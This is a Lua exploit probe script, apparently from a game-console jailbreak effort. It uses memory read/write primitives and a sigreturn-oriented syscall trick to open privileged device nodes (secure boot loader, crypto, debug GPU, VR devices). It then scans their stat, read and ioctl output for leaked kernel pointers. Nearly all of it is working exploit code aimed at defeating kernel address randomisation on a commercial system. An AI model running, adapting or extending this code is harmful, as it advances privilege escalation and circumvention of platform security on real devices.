-- CRASH_CLASS: MODERATE
-- PROBE 138a: Special device ioctl/read scan for kernel pointer leaks
--
-- 137f found 76 devices in /dev. Several are potentially interesting:
-- sbl_srv (secure boot loader), dbggc (debug GPU), encdec (crypto),
-- a53mm/a53mmsys (ARM co-proc), acm, fttrm, duid, lvd7
-- Try open, fstat, read, and ioctl on each for kernel pointer leaks.

print("=== PROBE 138a: SPECIAL DEVS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

local path_buf = gpu + 0x100
local stat_buf = gpu + 0x300
local io_buf   = gpu + 0x500
local rd_buf   = gpu + 0x800

local function check_kptr(buf, len, label)
    for off = 0, len - 1, 8 do
        local v = safe_rq(buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("  *** KPTR %s +0x%02X: %s ***", label, off, hex(v)))
            end
        end
    end
end

local function try_dev(name, flags_list)
    local fd = -1
    for _, fl in ipairs(flags_list) do
        ws(path_buf, "/dev/" .. name)
        local rv = srop(5, ua(path_buf), uint64(fl))
        local rh2, rl2 = get_hi_lo(rv)
        if rl2 > 0 and rl2 < 256 and rh2 == 0 then
            fd = rl2
            break
        end
    end
    if fd < 0 then
        print(string.format("[%s] open FAIL", name))
        return
    end
    print(string.format("[%s] fd=%d", name, fd))

    -- fstat for kernel pointers
    zero(stat_buf, 0x100)
    srop(189, uint64(fd), ua(stat_buf))
    check_kptr(stat_buf, 0x80, name.."/stat")
    local st_dev = safe_rq(stat_buf)
    local st_rdev = safe_rq(stat_buf + 0x50)
    print(string.format("[%s] dev=%s rdev=%s", name, hex(st_dev), hex(st_rdev)))

    -- try read (O_NONBLOCK should prevent blocking)
    zero(rd_buf, 0x200)
    local rv_rd = srop(3, uint64(fd), ua(rd_buf), uint64(0x200))
    local rdh, rdl = get_hi_lo(rv_rd)
    if rdl > 0 and rdl <= 0x200 and rdh == 0 then
        print(string.format("[%s] read: %d bytes!", name, rdl))
        local s = ""
        for i = 0, math.min(rdl, 32) - 1 do
            s = s .. string.format("%02X ", to_num(memory.read_byte(rd_buf + i)))
        end
        print(string.format("[%s] data: %s", name, s))
        check_kptr(rd_buf, math.min(rdl, 0x200), name.."/read")
    else
        print(string.format("[%s] read=%s", name, hex(rv_rd)))
    end

    -- ioctl scan: try a focused set of codes
    local ioctl_hits = 0
    local ioctl_codes = {
        0x20004400, 0x20004401, 0x20004402, 0x20004403,
        0x40044400, 0x40044401, 0x40044402, 0x40044403,
        0x40084400, 0x40084401, 0x40084402, 0x40084403,
        0xC0044400, 0xC0044401, 0xC0044402, 0xC0044403,
        0xC0084400, 0xC0084401, 0xC0084402, 0xC0084403,
        0x40104400, 0x40204400, 0x40404400,
        0x40044800, 0x40044801, 0xC0044800,
        0x40046400, 0x40046401, 0xC0046400,
        0x40044100, 0x40044101, 0xC0044100,
        0x40044200, 0x40044201, 0xC0044200,
        0x40044300, 0x40044301, 0xC0044300,
        0x40044500, 0x40044501, 0xC0044500,
        0x40044600, 0x40044601, 0xC0044600,
        0x40044700, 0x40044701, 0xC0044700,
    }
    for _, code in ipairs(ioctl_codes) do
        zero(io_buf, 0x100)
        local rv_io = srop(54, uint64(fd), uint64(code), ua(io_buf))
        local ioh, iol = get_hi_lo(rv_io)
        if iol == 0 and ioh == 0 then
            ioctl_hits = ioctl_hits + 1
            print(string.format("[%s] ioctl 0x%08X WORKS!", name, code))
            for off = 0, 0x40, 8 do
                local v = safe_rq(io_buf + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh > 0 or vl > 0 then
                        print(string.format("  +0x%02X: %s", off, hex(v)))
                    end
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print("  *** KERNEL POINTER! ***")
                    end
                end
            end
        end
    end
    print(string.format("[%s] ioctl_hits=%d", name, ioctl_hits))

    srop(6, uint64(fd))
end

--------------------------------------------------------------------
-- SECTION A: sbl_srv (Secure Boot Loader service)
--------------------------------------------------------------------
print("")
print("--- [A] sbl_srv ---")
try_dev("sbl_srv", {0x2004, 0x0004, 0x2002, 0x0002, 0x2000, 0x0000})
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: dbggc (Debug GPU Compute)
--------------------------------------------------------------------
print("")
print("--- [B] dbggc ---")
try_dev("dbggc", {0x2002, 0x0002, 0x2000, 0x0000})
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: encdec (Encryption/Decryption)
--------------------------------------------------------------------
print("")
print("--- [C] encdec ---")
try_dev("encdec", {0x2002, 0x0002, 0x2000, 0x0000})
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: a53mm / a53mmsys (ARM A53 co-processor memory mgmt)
--------------------------------------------------------------------
print("")
print("--- [D] a53mm ---")
try_dev("a53mm", {0x2002, 0x0002, 0x2000, 0x0000})
print("[D1] pid=" .. to_num(sc20()))
print("")
print("--- [D2] a53mmsys ---")
try_dev("a53mmsys", {0x2002, 0x0002, 0x2000, 0x0000})
print("[D2] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: acm (Access Control Manager)
--------------------------------------------------------------------
print("")
print("--- [E] acm ---")
try_dev("acm", {0x2002, 0x0002, 0x2000, 0x0000})
print("[E] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION F: fttrm, duid, lvd7, mp3, notification1, ctty
--------------------------------------------------------------------
print("")
print("--- [F] other devices ---")
local others = {"fttrm", "duid", "lvd7", "mp3", "notification1", "ctty"}
for _, d in ipairs(others) do
    try_dev(d, {0x2002, 0x0002, 0x2000, 0x0000})
end
print("[F] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION G: hmd2_image, hmd2_slam_trace (unique PSVR2 data devs)
--------------------------------------------------------------------
print("")
print("--- [G] VR devices ---")
try_dev("hmd2_image", {0x2000, 0x0000})
try_dev("hmd2_slam_trace", {0x2000, 0x0000})
print("[G] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
